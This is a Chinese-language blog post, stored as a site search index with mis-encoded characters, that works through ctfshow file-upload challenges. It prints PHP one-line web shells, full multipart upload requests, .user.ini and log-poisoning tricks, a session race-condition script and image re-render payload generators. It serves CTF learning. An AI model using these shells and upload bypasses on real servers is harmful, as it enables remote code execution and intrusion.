<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 2</title>
      <link href="/2023/02/08/ctfshow-web2/"/>
      <url>/2023/02/08/ctfshow-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2"><a href="#ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2" class="headerlink" title="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2"></a>ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡)</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13831713.html">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(æ”¾å¼ƒç¯‡)</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110558192?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167342861216800225578759%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167342861216800225578759&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-110558192-null-null.article_score_rank_blog&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97&spm=1018.2226.3001.4450">CTFSHOW ååºåˆ—åŒ–ç¯‡</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113808539">CTFshow-WEBå…¥é—¨-ååºåˆ—åŒ–</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167394115616800215092923%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167394115616800215092923&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109537262-null-null.article_score_rank_blog&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4450">CTFSHOWæ–‡ä»¶ä¸Šä¼ ç¯‡</a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html">MySQL 5.7 Reference Manual</a></p><p><a href="https://www.jb51.net/article/212587.htm">MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°</a></p></blockquote><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>æç¤º<code>å‰å°æ ¡éªŒä¸å¯é </code>ï¼Œç¦ç”¨<code>js</code>æˆ–è€…ç›´æ¥å‘åŒ…å°±å¯ï¼ˆ<code>png</code>å³å¯ï¼‰</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0e85dc83-97fd-4ea9-921a-3c2b43d36b63.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>202</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7VSPjBqZx9Pl0H7T</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://0e85dc83-97fd-4ea9-921a-3c2b43d36b63.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://0e85dc83-97fd-4ea9-921a-3c2b43d36b63.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>msg=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundary7VSPjBqZx9Pl0H7T</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary7VSPjBqZx9Pl0H7T--</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åç›´æ¥èšå‰‘è¿æ¥æˆ–è€…æ‰§è¡Œå‘½ä»¤å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/a.php?1=system(&#x27;tac ../flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>æç¤ºåç«¯æ ¡éªŒè¦ä¸¥å¯†ï¼Œç›´æ¥å‘åŒ…</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39421927-8d0d-4ee1-a509-91e361c3b7ee.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>203</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqZyuIUBOwCSDs4xw</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39421927-8d0d-4ee1-a509-91e361c3b7ee.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39421927-8d0d-4ee1-a509-91e361c3b7ee.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>msg=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqZyuIUBOwCSDs4xw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqZyuIUBOwCSDs4xw--</span></span><br></pre></td></tr></table></figure><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>è¿™é“é¢˜ç›®ä¸»è¦è€ƒå¯Ÿ<code>.user.ini</code>çš„åˆ©ç”¨</p><p>ä¸Šä¼ å›¾ç‰‡ğŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/index.php?1=system(%27tac%20../flag.php%27);</span><br></pre></td></tr></table></figure><blockquote><p>ä½†æ˜¯è¿™ç§æ–¹å¼å…¶å®æ˜¯æœ‰ä¸ªå‰æçš„ï¼Œå› ä¸º.user.iniåªå¯¹ä»–åŒä¸€ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰ä»–åŒç›®å½•ä¸‹æœ‰phpæ–‡ä»¶æ‰å¯ä»¥ã€‚</p></blockquote><p>å¯¹äºè¿™ä¸ªé¢˜ï¼Œå› ä¸ºuploadç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯å¯ä»¥æˆåŠŸçš„ã€‚</p><h2 id="web154-155"><a href="#web154-155" class="headerlink" title="web154-155"></a>web154-155</h2><p>è¿™é‡Œå¯¹æ–‡ä»¶å†…å®¹ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ•…å¯ä»¥ä½¿ç”¨ä¸€äº›çŸ­æ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®</span></span><br><span class="line"><span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span>  ç­‰ä»·äº <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œ7.0åŠä»¥ä¸Šä¿®æ”¹å®Œä¹‹åä¹Ÿä¸èƒ½ä½¿ç”¨ï¼Œè€Œæ˜¯æŠ¥500é”™è¯¯ï¼Œä½†æ˜¯7.0ä»¥ä¸‹ç‰ˆæœ¬åœ¨ä¿®æ”¹å®Œé…ç½®åå°±å¯ä»¥ä½¿ç”¨äº†ã€‚    </span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚</span></span><br><span class="line">&lt;script language=â€phpâ€&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>åé¢å‘ç°è²Œä¼¼å¯¹<code>flag</code>å­—ç¬¦ä¹Ÿè¿‡æ»¤äº†ï¼Œå¯ä»¥ç›´æ¥ä¼ ğŸç»•è¿‡å»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿™æ ·å†™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä»–åŒ<code>web153</code></p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p><code>[]</code>è¢«banäº†ï¼Œæ¢ç”¨<code>&#123;&#125;</code>å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä»–åŒ<code>web153</code></p><h2 id="web157-159"><a href="#web157-159" class="headerlink" title="web157-159"></a>web157-159</h2><p>è¿‡æ»¤äº†<code>&#123;&#125;</code>å’Œ<code>;</code>ï¼Œç›´æ¥è¾“å‡º<strong>flag</strong>å³å¯ï¼Œå›¾ç‰‡ğŸå¦‚ä¸‹ï¼Œå…¶ä»–åŒ<code>web153</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…è¿™ç§ä¹Ÿå¯(<code>web159</code>è¿‡æ»¤äº†æ‹¬å·ä¸å¯ä»¥è¿™æ ·)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../f*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>è¿‡æ»¤äº†æ‹¬å·åå¼•å·è¿˜æœ‰ä¸€äº›å…³é”®å­—ï¼Œé‡‡å–æ—¥å¿—åŒ…å«ï¼Œç”±äº<code>log</code>å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦æ‹¼æ¥ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å®Œæ”¹å›¾ç‰‡ğŸåä¸Šä¼ <code>.user.ini</code>ï¼Œç„¶åä¿®æ”¹<code>UA</code>è®¿é—®<code>/upload.php</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system(&#x27;tac ../f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>å¢åŠ å›¾ç‰‡å¤´å³å¯ï¼Œå…¶ä»–åŒ<code>web160</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure><h2 id="web162-163"><a href="#web162-163" class="headerlink" title="web162-163"></a>web162-163</h2><p><code>session</code>åŒ…å«ï¼Œä¼ ğŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_evo1&quot;?&gt;</span><br></pre></td></tr></table></figure><p>ä¼ é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_append_file=&quot;png&quot;</span><br></pre></td></tr></table></figure><p>å‚è€ƒ<a href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167394115616800215092923%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167394115616800215092923&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109537262-null-null.article_score_rank_blog&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4450">yu22xå¸ˆå‚…è„šæœ¬</a>æ”¹ä¸€ä¸‹å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;evo1&#x27;</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://703e9d52-141b-4ca2-9b3d-09aa927e88a7.challenge.ctf.show/&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://703e9d52-141b-4ca2-9b3d-09aa927e88a7.challenge.ctf.show/upload/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">session.post(url=url1, data=data, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ï¼Œç”¨<code>yu22x</code>çš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span></span><br><span class="line"><span class="comment">/* æœ¨é©¬å†…å®¹</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå›¾ç‰‡ğŸä¸Šä¼ åç‚¹å‡»æŸ¥çœ‹ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download.php?image=fb5c81ed3a220004b71069645f112867.png&amp;0=system</span><br><span class="line">POST:</span><br><span class="line">1=cat f*</span><br></pre></td></tr></table></figure><p><code>ctrl+s</code>ä¿å­˜ä¸‹æ¥æŸ¥çœ‹å›¾ç‰‡æ–‡æœ¬å³å¯</p><p><img src="https://cdnjson.com/images/2023/02/08/web164.jpg" alt="web164.jpg"></p><h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>jpgå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ï¼Œè¿˜æ˜¯ç”¨<code>yu22x</code>çš„è„šæœ¬(å¤§ä½¬<code>orz</code>)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//ç”¨æ³•  php JpgRendering.php test.jpg</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span 